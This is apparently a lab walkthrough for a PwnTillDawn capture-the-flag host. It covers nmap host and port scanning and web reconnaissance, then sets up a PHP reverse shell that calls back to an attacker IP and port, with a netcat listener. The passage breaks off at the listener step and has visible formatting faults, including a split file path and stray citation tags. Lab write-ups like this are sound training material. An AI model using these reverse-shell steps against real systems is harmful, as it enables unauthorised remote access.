# 1. VPN Setup

Before interacting with the lab environment, download the .ovpn file from the PwnTillDawn portal and connect via OpenVPN. [page:1]

        sudo openvpn PwnTillDawn.ovpn

Once you see Initialization Sequence Completed, the tunnel is up and you are inside the 10.150.150.0/24 network. [page:1]

<img width="847" height="815" alt="image" src="https://github.com/user-attachments/assets/ffbc71f0-94c4-48a2-99c2-3c6deeb1c52f" />

# 2. Host Discovery — Network Scan

With the VPN established, perform a ping sweep to discover live hosts in the range. [page:1]

        nmap -sn 10.150.150.10-254

| option | Description                                        |
|--------|----------------------------------------------------|
| `-sn`  | Ping scan only — no port scan, just host discovery |

Result: 47 live hosts are detected, including the target 10.150.150.18. [page:1]

<img width="618" height="843" alt="image" src="https://github.com/user-attachments/assets/98d21fa9-4dcd-4f88-89bc-efb8a08987eb" />

# 3. Target Enumeration — Port Scan

Run a service and version scan against the target to identify open ports and running services. [page:1]

        nmap -sC -sV -v 10.150.150.18 -oN nmap

| option     | Description               |
|--------    |---------------------------|
| `-sC`      | Run default NSE scripts   |
| `-sV`      | Detect service versions   |
| `-V`       | Verbose output            |
| `-oN nmap` | Save output to file `nmap`|


Open the target in a browser: [page:1]

Results:

| port | State | Service           |
|------|-------|-------------------|
| 80   | open  | HTTP (web server) |

Only port 80 (HTTP) is open on this host. [page:1]

<img width="564" height="374" alt="image" src="https://github.com/user-attachments/assets/c775fcb9-f019-4d1b-8fa0-52196fa037a9" />

# 4. Web Application Reconnaissance

Open the target in a browser: [page:1]

        http://10.150.150.18

<img width="943" height="773" alt="image" src="https://github.com/user-attachments/assets/a29050ff-acd5-4e04-9db4-f803aea7abb2" />

Enumerate the application: look for upload forms, parameters, file inclusion points, and anything that might lead to arbitrary file upload or code execution. [page:1]

# 5. Exploitation — Web Reverse Shell

## 5.1 Prepare the Reverse Shell

The web application exposes a vulnerability that allows us to upload or inject a PHP reverse shell. [page:1]

On Kali, use the Pentestmonkey PHP reverse shell located at: [page:1]


        /usr/share![Uploading Screenshot 2026-04-04 234239.png…]()
        /webshells/php/php-reverse-shell.php

<img width="634" height="279" alt="image" src="https://github.com/user-attachments/assets/fa64213b-6e19-44cb-8558-94455271050b" />

Edit it to set your VPN IP and listening port:

        $ip   = '10.150.150.XXX'; // Your VPN IP
        $port = 1234;             // Your listening port
        ``` [page:1]

### 5.2 Set Up a Netcat Listener

On your attacking machine, start a Netcat listener **before** triggering the shell: [page:1]

```bash
nc -lvnp 1234





